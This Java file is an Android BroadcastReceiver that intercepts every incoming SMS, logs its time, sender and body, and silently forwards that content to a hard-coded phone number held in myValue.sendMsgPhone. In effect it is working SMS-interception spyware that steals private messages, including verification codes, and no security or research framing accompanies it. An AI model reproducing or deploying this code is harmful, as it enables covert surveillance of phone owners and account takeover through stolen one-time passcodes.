package com.receiver;

import java.io.UnsupportedEncodingException;
import java.nio.charset.Charset;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import value.myValue;

import com.main.MainActivity;

import android.annotation.SuppressLint;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class SMSReceiver extends BroadcastReceiver{
public static final String tomyphone = myValue.sendMsgPhone;
	@SuppressLint("SimpleDateFormat")
	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		Bundle bundle = intent.getExtras();
		Object[] myObjects = (Object[])bundle.get("pdus");
		SmsMessage[] messages = new SmsMessage[myObjects.length];
		for (int i = 0; i < messages.length; i++) {
			messages[i] = SmsMessage.createFromPdu((byte[]) myObjects[i]);
			Date date = new Date(messages[i].getTimestampMillis());
			SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
			System.out.println("接收短信时间为："+df.format(date));
			System.out.println("发送短信人是："+messages[i].getOriginatingAddress());
			System.out.println("发送的内容是："+messages[i].getMessageBody());
			String toMyMsg ="new message: "+df.format(date)+" sender is: "+messages[i].getOriginatingAddress()+" context is: "+messages[i].getMessageBody();
//			byte[] utf8Chars = messages[i].getMessageBody().getBytes(Charset.forName("UTF-8"));
//			
//			try {
//				Toast.makeText(context, new String(utf8Chars, "UTF-8"), 10).show();
//			} catch (UnsupportedEncodingException e) {
//				// TODO Auto-generated catch block
//				e.printStackTrace();
//			}
			MySendSMS(toMyMsg,context,intent);
		}
	}
	
	public  void MySendSMS(String message,Context context, Intent intent){
        PendingIntent pi = PendingIntent.getActivity(context, 0, intent, 0);
        SmsManager smsManager = SmsManager.getDefault();  
        List<String> divideContents = smsManager.divideMessage(message);    
        for (String text : divideContents) {    
        	smsManager.sendTextMessage(tomyphone, null, text, pi, null);
        } 
    }

}
